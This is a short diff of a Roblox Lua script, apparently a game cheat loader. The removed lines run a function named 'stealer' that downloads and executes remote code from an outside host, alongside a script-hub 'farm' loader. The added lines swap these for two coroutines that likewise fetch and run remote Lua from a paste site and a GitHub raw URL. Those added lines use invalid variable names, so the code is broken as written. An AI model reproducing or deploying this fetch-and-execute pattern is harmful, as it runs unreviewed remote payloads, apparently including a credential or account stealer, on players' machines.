@@ -1,10 +1,15 @@
-local function stealer()
-    
-loadstring(game:HttpGet("https://egorikusa.space/c3b403a8aa3d133a71665632.lua", true))()
-end
-local function farm()
-    loadstring(game:HttpGet("https://rawscripts.net/raw/Eclipse-Hub_805"))()
-end
+local 1=
+    coroutine.create(
+    function()
+loadstring(game:HttpGet("https://pastefy.app/myonC9sF/raw"))()
+    end
+)
+local 2=
+    coroutine.create(
+    function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Joystickplays/psychic-octo-invention/main/yarhm.lua", true))()
+    end
+)
 
-task.spawn(stealer)
-task.spawn(farm)
+coroutine.resume(2)
+coroutine.resume(1) 
